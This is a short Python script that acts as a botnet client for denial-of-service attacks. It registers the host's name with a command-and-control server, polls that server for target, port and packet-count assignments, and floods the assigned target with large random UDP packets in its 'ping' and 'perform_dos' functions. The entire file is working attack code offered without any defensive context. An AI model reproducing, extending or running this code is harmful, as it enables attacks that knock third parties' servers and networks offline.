"""
    Execution Flow:
        1. Check if config file with registration info exists
        2. Pull data from that file.  If it doesn't exist, register self with
            server and create registration info file
        3. Contact server using UUID in registration file, determine if active
            and assigned task.
        4. Continue to check for task if no task.
        5. Once a task is given, perform task (ping X number of times) and check
            if still active and if still assigned
"""

import requests
import json
import socket
import random
import os
from time import sleep

API_URL = ""
UUID = ""

def get_uuid():
    """
        Gets and saves a unique identifier for this computer.
        Only called if the 'config' file does not exist
    """
    if not API_URL:
        get_api_location()
    pc_name = socket.gethostname()
    response = requests.put(API_URL + "/clients?name=" + pc_name)
    return response.json()


def get_api_location():
    """
        Gets the domain name of the API from file.  This file really needs to
        exist
    """
    try:
        file = open("domain")
        for line in file.readlines():
            global API_URL
            API_URL = line.rstrip()
            break
    except:
        print("Holy fuck, the only thing you had to do and you didn't do it")


def get_config():
    global UUID
    try:
        file = open("config", "r+")
        for line in file.readlines():
            UUID = line
            break
        file.close()
    except:
        UUID = get_uuid()
        file = open("config", "x")
        file.write(str(UUID))


def ping(target, port, chunksize):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(65507)
    i = 0
    while i <= chunksize:
        sock.sendto(bytes,(target,port))
        print("Sent " + str(i) + " packets")
        i+=1


def get_assignment():
    data = requests.get(API_URL + "/clients/" + UUID).json()[0]
    active = data['active']
    task_id = data['task_id']
    if active and task_id:
        task = requests.get(API_URL + "/tasks/" + str(task_id)).json()[0]
        target = task['target']
        port = task['port']
        chunksize = task['chunksize']
        active = task['active']
        if active:
            return target, port, chunksize
    return False, False, False


def perform_dos():
    while True:
        target, port, chunksize = get_assignment()
        if target and port and chunksize:
            ping(target, port, chunksize)
        else:
            print("No Assignment")
            sleep(5)


def main():
    get_api_location()
    get_config()
    perform_dos()


main()
